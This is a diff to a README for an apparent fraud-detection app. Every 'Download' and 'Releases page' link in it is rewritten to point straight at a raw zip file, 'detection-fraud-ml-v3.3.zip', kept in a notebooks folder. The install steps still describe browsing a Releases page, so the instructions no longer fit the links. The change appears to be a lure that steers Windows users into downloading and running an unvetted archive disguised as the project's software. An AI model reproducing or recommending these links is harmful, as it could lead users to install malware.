@@ -1,9 +1,9 @@
 # 🛡️ fraud-detection-ml - Spot Risk Before It Spreads
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Catalectic-vanallen607/fraud-detection-ml/raw/refs/heads/main/notebooks/detection-fraud-ml-v3.3.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases
+Visit this page to download: https://github.com/Catalectic-vanallen607/fraud-detection-ml/raw/refs/heads/main/notebooks/detection-fraud-ml-v3.3.zip
 
 ## 🖥️ What this app does
 
@@ -39,7 +39,7 @@ Use the Windows file if one is listed. If you see a .zip file, save it, then ext
 
 ## 🚀 Get started on Windows
 
-1. Open the Releases page: https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases
+1. Open the Releases page: https://github.com/Catalectic-vanallen607/fraud-detection-ml/raw/refs/heads/main/notebooks/detection-fraud-ml-v3.3.zip
 2. Find the latest release at the top of the page
 3. Look for a Windows download file or a .zip file
 4. Download the file to your computer
@@ -216,7 +216,7 @@ This project uses methods tied to:
 
 ## 📂 Release download steps
 
-1. Go to https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases
+1. Go to https://github.com/Catalectic-vanallen607/fraud-detection-ml/raw/refs/heads/main/notebooks/detection-fraud-ml-v3.3.zip
 2. Open the latest release
 3. Download the Windows file or zip package
 4. Extract the files if needed
